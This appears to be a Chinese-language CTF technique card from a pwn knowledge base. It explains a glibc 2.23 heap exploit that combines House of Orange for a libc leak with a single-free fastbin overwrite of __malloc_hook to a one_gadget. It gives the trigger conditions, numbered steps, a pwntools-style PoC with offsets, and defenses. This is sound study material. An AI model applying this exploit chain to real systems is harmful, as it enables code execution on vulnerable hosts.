---
id: binary-pwn-heap-house-of-orange-single-free-fastbin-malloc-hook-onegadget
title: 仅一次 free 的堆题：House of Orange 造 unsorted bin 泄 libc，再用这一次 free 做 fastbin 改 __malloc_hook 打 one_gadget
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-orange-single-free-fastbin-malloc-hook-onegadget
aliases:
- orange_cat_diary
- House of Orange 单次 free
- top chunk 进 unsorted bin 泄 libc
- 一次 free 改 malloc_hook
- __malloc_hook-0x23
- 无 free 次数限制的 House of Orange
tags:
- pwn
- heap
- glibc
- glibc223
- house-of-orange
- top-chunk
- unsorted-bin
- fastbin
- malloc-hook
- one-gadget
- ctf
cve: []
severity: high
confidence: high
affected_versions: glibc 2.23–2.24（原文标记）
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V371
  verified_at: '2026-11-09T05:47:32+08:00'
  notes: 已对照原文核对；单次 free 链（add 0x108→edit 0xef1→add 0x1000→add 0x60 泄 main_arena→dele→edit malloc_hook-0x23→两次 add 写 one_gadget 0xf03a4）与图01-04一致；图01 top size 显示 0xed1 而原文 exp 文字为 0xef1，卡内按文字记录并注明随题目变化；glibc 2.23–2.24 为原文明确标记；未复跑 PoC
---

## 一句话结论

程序只允许 free 一次（甚至没有 free）时，可以先堆溢出改 top chunk 的 `size`，再申请一个大于它的块，让 `sysmalloc` 把旧 top 释放进 unsorted bin；随后申请小块切出残余的 `fd`/`bk` 泄露 libc，把这唯一一次 free 用在切出的小块上做 UAF 改 fastbin `fd` 指向 `__malloc_hook - 0x23`，两次 `malloc` 后把 one_gadget 写进 `__malloc_hook`，下一次 `malloc` 即触发 shell。

## 原理

- **House of Orange 的触发条件**：`_int_malloc` 在 top chunk 不够时会走 `sysmalloc`；若请求满足
  - `MINSIZE < old_top_size < nb + MINSIZE`（旧 top 不能太小、也不能大到足以直接切给本次请求），
  - old top 的 `prev_inuse` 位为 1，
  - `old_top + old_top_size` 与页边界对齐（否则 `systrim`/断言失败），
  - 请求 `nb < 0x20000`（超过则走 mmap，不会扩展 top），
  则 `sysmalloc` 会分配新 top，并把旧 top 作为普通空闲块 `_int_free` 进 unsorted bin。没有 free 功能的程序由此凭空得到一块 unsorted chunk。
- **切块泄 libc**：旧 top 进入 unsorted bin 后，其 `fd`/`bk` 指向 `main_arena+88` 一类的 bin 头。申请一个小于旧 top 的小块（题目为 `0x60`）会从 unsorted bin 中切出该块，切出的用户数据里仍残留 `fd`/`bk` 指针；`show` 读出 6 字节即可算出 `main_arena` 与 libc 基址（本例 `main_arena = leak - 0x61`，`libc = main_arena - 0x3c5100`，偏移随 libc 版本而变）。
- **把唯一一次 free 用在刀刃上**：切出的小块被 `free` 后（glibc 2.23 无 tcache）进入 fastbin；程序对已释放块仍保留 `edit`/写能力（UAF），把其 `fd` 改成 `__malloc_hook - 0x23`。该地址附近的字节恰好能被解释为一个合法 fastbin size（`0x7f`），从而通过 `malloc` 的 size class 校验。
- **两次 malloc 落 hook**：第一次 `malloc(0x60)` 取回被释放的小块，第二次 `malloc(0x60)` 返回 `__malloc_hook - 0x23`；用户数据从 chunk 头 +0x10 开始，所以先写 `0x13` 字节填充，再写 one_gadget 刚好落在 `__malloc_hook`。
- **触发**：`__malloc_hook` 在每次 `malloc` 入口被调用；再执行一次 `malloc`（菜单的 add 即可）跳转 one_gadget。one_gadget 需满足约束（本例 `0xf03a4` 要求 `[rsp+0x50] == NULL`），不满足时换其他 gadget。
- **为什么适合“只能 free 一次”**：常规 fastbin UAF 需要多次 free/double free，而 House of Orange 先用“无 free”方式制造 unsorted bin 并完成 libc 泄露，把仅剩的一次 free 留给 fastbin 攻击，二者互补。

## 触发条件

- glibc 2.23–2.24（无 tcache；`__malloc_hook` 仍存在并被调用），题目提供对应 libc。
- 程序有 add/show/edit/delete 菜单，delete 次数受限（本例仅一次），但 edit 能越界写或对已释放块写（UAF）。
- 能通过堆溢出改到 top chunk 的 `size` 字段，且请求大小可控、能申请大于旧 top 的块（且 < 0x20000）。
- `__malloc_hook - 0x23` 处的伪 size 能通过 fastbin 校验（glibc 2.23 常用技巧），且有可用的 one_gadget。

## 利用步骤

1. 申请 `0x108` 的块，利用 edit 写入 `0x108` 字节数据 + `p64(0xef1)`，把 top chunk 的 size 改为 `0xef1`（保持 prev_inuse，且满足页对齐条件）。
2. `add(0x1000)`：请求大于旧 top 的 size，`sysmalloc` 把旧 top 释放进 unsorted bin 并建立新 top。
3. `add(0x60)`：从 unsorted bin 切出小块，`show()` 读取其残留 `fd`/`bk`（读到 `0x7f` 为止），计算 `main_arena` 与 libc 基址。
4. `dele()`：利用唯一一次 free 把该 `0x60` 块释放进 fastbin。
5. `edit(0x20, p64(__malloc_hook - 0x23))`：UAF 改 fastbin `fd`。
6. `add(0x60, b'a')` 取回原块；`add(0x60, b'a'*0x13 + p64(one_gadget))` 分配到 `__malloc_hook - 0x23`，把 one_gadget 写到 `__malloc_hook`。
7. 再触发一次 `malloc`（如 add 任意块），`__malloc_hook` 调用 one_gadget 拿 shell。

## PoC

关键步骤（libc 偏移、gadget 与堆布局随题目变化，未在本机复跑）：

```python
add(0x108, b'a')
edit(0x110, b'a'*0x108 + p64(0xef1))   # 改 top chunk size
add(0x1000, b'a')                       # 触发 sysmalloc，旧 top 进 unsorted bin
add(0x60)                               # 切出残余块
show()
main_arena = u64(recv(6).ljust(8, b'\x00')) - 0x61
libc.address = main_arena - 0x3c5100
gadget = libc.address + 0xf03a4         # 需满足 [rsp+0x50] == NULL
dele()                                  # 唯一一次 free
edit(0x20, p64(libc.symbols['__malloc_hook'] - 0x23))
add(0x60, b'a')                         # 取回原 fastbin 块
add(0x60, b'a'*0x13 + p64(gadget))      # 落到 __malloc_hook
# 再调用一次 malloc 触发 one_gadget
```

## 变体与关联

- **收尾变体**：不写 `__malloc_hook` 而改 `__free_hook`/`exit_hook`；或把 fastbin 指向可控堆块伪造 vtable 走 FSOP。
- **House of Orange 家族**：经典“无 free + FSOP 打 `_IO_list_all`”见 [[binary-pwn-heap-house-of-orange-unsortedbin-io-list-all-fsop-system]]；无 free + fastbin fake chunk 改 GOT 见 [[binary-pwn-heap-house-of-orange-fastbin-got-onegadget]]；top chunk 任意分配见 [[binary-pwn-heap-house-of-force-topchunk-to-malloc-hook]]。
- **fastbin/malloc_hook 家族**：`__malloc_hook - 0x23` 伪 size 与 fastbin dup 的通用打法见 [[binary-pwn-heap-glibc223-uaf-fastbin-dup-malloc-hook-realloc-onegadget]]、[[binary-pwn-heap-house-of-roman-fastbin-unsortedbin-malloc-hook-bruteforce]]。
- **边界**：glibc 2.24+ 起 `_IO_vtable` 校验影响 FSOP 但不影响本卡；2.31+ tcache/safe-linking 与 2.34 移除 malloc hook 会使该链失效，需要改打新 sink。

## 检测与防御

- **代码修复**：edit 必须校验目标块是否已释放与真实大小，禁止对已释放块写入；add 的 size 做上限与整数校验，禁止覆盖 top chunk size。
- **编译/运行**：升级 glibc 到 2.34+（移除 malloc/free hook）或启用 tcache/safe-linking 的版本；开启 PIE/Full RELRO 增加地址依赖；启用 MALLOC_CHECK_ 等堆检查。
- **检测**：top chunk size 被改写为异常值、`__malloc_hook` 被写入非空值、heap 中出现指向 `main_arena` 的泄露输出、进程执行 `/bin/sh`。
- **说明**：本文为 CTF/授权环境技术总结，exp 中的 libc 偏移与 gadget 依赖题目环境。
